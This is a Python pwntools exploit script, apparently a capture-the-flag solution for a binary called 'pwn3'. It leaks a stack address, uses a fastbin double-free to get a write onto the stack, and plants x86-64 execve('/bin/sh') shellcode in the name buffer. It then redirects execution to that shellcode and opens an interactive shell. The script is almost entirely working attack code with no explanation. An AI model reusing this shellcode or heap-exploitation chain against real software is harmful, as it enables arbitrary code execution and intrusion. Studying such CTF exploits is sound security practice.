#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-07 19:09:17
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1

if DEBUG:
	p = process('./pwn3')
	# gdb.attach(p,"b*0x4009da\nc")
# else:
# 	p = remote()

def sd(data):
	p.sendline(data)
def ru(data):
	return p.recvuntil(data)

def welcome(data):
	ru("name\n")
	sd(data)

def add(index,length,data):
	ru("delete paper\n")
	sd("1")
	ru("o store(0-9):")
	sd(str(index))
	ru("ill enter:")
	sd(str(length))
	ru("our content:")
	sd(data)


def add2(index,length,data):
	sd("1")
	ru("o store(0-9):")
	sd(str(index))
	ru("ill enter:")
	sd(str(length))
	ru("our content:")
	sd(data)

def dele(index):
	ru("delete paper\n")
	sd("2")
	ru("index(0-9):")
	sd(str(index))
def setsize(size):
	ru("delete paper\n")
	sd("3")
	ru("number:")
	sd(str(size))
def leak_stack():
	ru("delete paper\n")
	sd("a"*(0x30))
	ru("\n")
	sd("a"*(0x30))
	return u64(ru("\n")[0x30:0x30+6].ljust(8,"\x00"))

buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

shellcode = buf
shellcode_addr = 0x6020c0

welcome(shellcode)
setsize(0x30)
stack_addr = leak_stack()


print "stack_addr="+hex(stack_addr)
offset = 0x7ffcfca53d30 - 0x00007ffcfca53c20 
target_addr = stack_addr-offset-0x8
print "offset = "+hex(offset)
print "target_addr = "+hex(target_addr)

add2(0,0x20,"aaa")
add(1,0x20,"aaa")
dele(0)
dele(1)
dele(0)#a-b-a
add(0,0x20,p64(target_addr))
add(1,0x20,"aaa")
add(2,0x20,p64(target_addr))
payload = "a"*0x10+p64(shellcode_addr)
add(3,0x20,payload)
sd("4")

p.interactive()